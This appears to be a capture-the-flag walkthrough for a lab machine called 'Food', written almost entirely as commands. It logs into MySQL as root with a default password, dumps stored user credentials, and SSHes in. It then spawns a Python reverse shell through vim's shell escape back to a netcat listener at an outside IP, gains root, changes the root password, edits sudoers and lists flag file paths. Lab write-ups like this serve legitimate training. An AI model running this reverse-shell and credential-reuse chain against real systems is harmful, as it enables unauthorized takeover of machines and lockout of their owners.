# Food
 1. `mysql -u root -h food.thm -p` password is `root`
 2. `select * from user` now you have user `ramen : noodlesRTheBest`
 3. `ssh ramen@food.thm`
 4. `nc -nvlp 8888`
 5. 
```
vim -c ':!python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.85.10",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'&
```
 7. now you are root
 8. `passwd` and change root passwd
 9. `vim /etc/sudoers` and delete sudo perms
 10. `find / -name flag 2>/dev/null`

# Flags
1. /root/flag
2. /root/.profile
3. /root/.mysql_history
4. /home/bread/flag
5. /home/food/.flag
6. /home/tryhackme/flag7
7. /var/flag.txt
8. /var/log/auth.log
